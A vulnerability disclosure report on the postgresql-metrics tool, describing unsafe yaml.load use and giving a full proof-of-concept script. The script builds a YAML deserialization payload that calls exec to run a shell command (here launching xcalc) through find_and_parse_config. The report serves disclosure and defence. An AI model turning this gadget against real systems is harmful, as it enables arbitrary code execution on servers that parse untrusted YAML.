# Description
Tool that extracts and provides metrics on your PostgreSQL database
* **Vulnerability discription**
unsafe loading of data by the yaml.load function leading to Arbitrary code execution.
# Proof of Concept
* Vulnerable code part 
```python
read_config_dict = yaml.load(f)
#https://github.com/spotify/postgresql-metrics/blob/master/postgresql_metrics/common.py#L116
```
1. run exploit.py
```python
# exploit.py
import os
#SETUP
os.system('git clone https://github.com/spotify/postgresql-metrics')
os.system('pip install -r postgresql-metrics/requirements.txt')
os.system('python postgresql-metrics/setup.py install')
import postgresql_metrics.common as ppyfile
#PAYLOAD SECTION
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
os.system('rm -r exploit.yml')
open('exploit.yml','w+').write(exploit)
#RUN THE EXPLOIT ON THE VULNERABLE PART
ppyfile.find_and_parse_config('exploit.yml')
os.system('rm -r exploit.yml')
```
![]()
